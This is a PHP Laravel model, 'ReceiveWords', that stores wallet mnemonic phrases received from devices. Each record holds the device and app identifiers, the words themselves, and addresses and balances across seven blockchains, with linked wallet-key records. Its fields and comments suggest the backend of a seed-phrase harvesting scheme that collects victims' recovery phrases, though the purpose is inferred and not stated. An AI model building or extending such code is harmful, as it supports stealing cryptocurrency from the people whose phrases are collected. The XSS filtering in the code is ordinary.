<?php

namespace App\Models;

class ReceiveWords extends BaseModel
{
    /**
     * The table associated with the model.
     *
     * @var string
     */
    protected $table = 'receive_words';

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = [
        'device_id',
        'device_number',
        'app_name',
        'app_package',
        'words',
        'wallet_address_btc',
        'wallet_address_eth',
        'wallet_address_bsc',
        'wallet_address_tron',
        'wallet_address_sol',
        'wallet_address_ton',
        'wallet_address_xrp',
        'wallet_balance_btc',
        'wallet_balance_eth',
        'wallet_balance_bsc',
        'wallet_balance_tron',
        'wallet_balance_sol',
        'wallet_balance_ton',
        'wallet_balance_xrp',
        'wallet_balance_eth_usdt',
        'wallet_balance_bsc_usdt',
        'wallet_balance_tron_usdt',
    ];

    /**
     * 过滤XSS风险字符（完整过滤）
     * 
     * @param string $value
     * @return string
     */
    protected function sanitizeString($value)
    {
        if (is_null($value)) {
            return null;
        }
        
        // 移除HTML标签和PHP标签
        $value = strip_tags($value);
        
        // 转义特殊字符，防止XSS
        $value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8', false);
        
        // 移除控制字符（除了换行符、制表符、回车符）
        $value = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $value);
        
        return trim($value);
    }

    /**
     * 轻量过滤（仅移除HTML标签，保留原始字符，用于敏感数据如助记词、钱包地址）
     * 
     * @param string $value
     * @return string
     */
    protected function sanitizeSensitiveString($value)
    {
        if (is_null($value)) {
            return null;
        }
        
        // 移除HTML标签、PHP标签和脚本标签，但保留原始字符
        $value = strip_tags($value);
        
        // 移除JavaScript事件处理器（如onclick, onerror等）
        $value = preg_replace('/on\w+\s*=\s*["\'][^"\']*["\']/i', '', $value);
        $value = preg_replace('/on\w+\s*=\s*[^\s>]*/i', '', $value);
        
        // 移除控制字符（除了换行符、制表符、回车符）
        $value = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $value);
        
        return trim($value);
    }

    /**
     * 设置助记词属性（轻量过滤，保留原始字符）
     *
     * @param string $value
     * @return void
     */
    public function setWordsAttribute($value)
    {
        $this->attributes['words'] = $this->sanitizeSensitiveString($value);
    }

    /**
     * 设置应用名称属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setAppNameAttribute($value)
    {
        $this->attributes['app_name'] = $this->sanitizeString($value);
    }

    /**
     * 设置应用包名属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setAppPackageAttribute($value)
    {
        $this->attributes['app_package'] = $this->sanitizeString($value);
    }

    /**
     * 设置设备号属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setDeviceNumberAttribute($value)
    {
        $this->attributes['device_number'] = $this->sanitizeString($value);
    }

    /**
     * 关联的钱包密钥记录
     *
     * @return \Illuminate\Database\Eloquent\Relations\HasMany
     */
    public function walletKeys()
    {
        return $this->hasMany(ReceiveWordKey::class, 'receive_word_id');
    }








}

